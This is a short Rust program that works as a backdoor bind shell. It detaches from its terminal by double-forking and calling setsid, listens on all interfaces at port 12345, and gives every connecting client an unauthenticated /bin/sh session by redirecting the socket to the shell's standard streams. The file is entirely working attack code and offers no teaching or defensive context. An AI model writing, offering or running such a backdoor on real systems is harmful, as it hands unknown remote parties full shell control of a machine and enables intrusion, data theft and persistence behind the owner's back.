use nix::unistd::{fork, ForkResult, setsid, dup2, close};
use std::net::TcpListener;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use std::io::{self};

fn daemonize() -> nix::Result<()> {
    match unsafe { fork()? } {
        ForkResult::Child => {
            setsid()?;
            match unsafe { fork()? } {
                ForkResult::Child => Ok(()),
                ForkResult::Parent { .. } => std::process::exit(0),
            }
        },
        ForkResult::Parent { .. } => std::process::exit(0),
    }
}

fn handle_client(stream: std::net::TcpStream) -> io::Result<()> {
    let fd = stream.as_raw_fd();
    
    dup2(fd, 0).unwrap();
    dup2(fd, 1).unwrap();
    dup2(fd, 2).unwrap();

    Command::new("/bin/sh")
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .status()?;

    Ok(())
}

fn main() -> io::Result<()> {
    daemonize().expect("Failed to daemonize");

    let listener = TcpListener::bind("0.0.0.0:12345")?;
    listener.set_nonblocking(true)?;

    loop {
        match listener.accept() {
            Ok((stream, _addr)) => {
                match unsafe { fork() } {
                    Ok(ForkResult::Child) => {
                        handle_client(stream)?;
                        std::process::exit(0);
                    }
                    Ok(ForkResult::Parent { .. }) => {
                        drop(stream);
                    }
                    Err(_) => std::process::exit(1),
                }
            }
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                continue;
            }
            Err(_) => std::process::exit(1),
        }
    }
}
